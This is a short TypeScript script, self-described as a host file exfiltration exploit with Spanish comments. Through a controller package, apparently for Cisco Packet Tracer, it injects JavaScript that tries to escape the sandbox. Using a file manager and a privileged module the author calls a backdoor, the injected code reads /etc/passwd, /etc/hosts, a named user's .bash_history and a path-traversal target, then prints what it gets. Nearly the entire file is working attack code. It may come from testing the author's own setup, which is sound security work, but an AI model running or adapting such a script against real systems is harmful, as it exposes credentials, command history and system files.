#!/usr/bin/env bun
/**
 * HOST FILE EXFILTRATION EXPLOIT
 * Intenta leer archivos del sistema operativo anfitrión (macOS) desde PT.
 */

import { createDefaultPTController } from "@cisco-auto/pt-control";

async function exfiltrate() {
  const controller = createDefaultPTController();
  try {
    await controller.start();
    console.log("\n💀 INICIANDO JAILBREAK V7: EXFILTRACIÓN DE HOST...");

    // Archivos a intentar leer (macOS/Linux)
    const targets = [
        "/etc/hosts",
        "/etc/passwd",
        "/Users/andresgaibor/.bash_history",
        "../../../../../../../../etc/hosts" // Path Traversal
    ];

    for (const path of targets) {
        process.stdout.write(`🕵️ Intentando leer: ${path}... `);
        
        // Probamos vía SystemFileManager y vía _ScriptModule directamente
        const exploit = `
            (function() {
                try {
                    // Intento 1: FileManager estándar
                    var fm = ipc.systemFileManager();
                    var res = fm.getFileContents("${path}");
                    if (res) return "FM_SUCCESS:" + res.substring(0, 50);
                    
                    // Intento 2: _ScriptModule Privilegiado (nuestro backdoor)
                    var priv = _ScriptModule;
                    var res2 = priv.getFileContents("${path}");
                    if (res2) return "PRIV_SUCCESS:" + res2.substring(0, 50);
                    
                    return "NOT_FOUND_OR_BLOCKED";
                } catch(e) { return "ERROR: " + e; }
            })()
        `;

        const res = await controller.send("__evaluate", { code: exploit });
        
        if (res.ok && !res.result.includes("NOT_FOUND")) {
            console.log(`\n\x1b[32m✅ ¡VULNERABILIDAD CONFIRMADA! Datos extraídos:\x1b[0m`);
            console.log(`--------------------------------------------------`);
            console.log(res.result);
            console.log(`--------------------------------------------------\n`);
        } else {
            console.log(`\x1b[31mPROTEGIDO\x1b[0m (${res.result})`);
        }
    }

  } catch (error: any) {
    console.error(`Error: ${error.message}`);
  } finally {
    await controller.stop();
  }
}

exfiltrate();
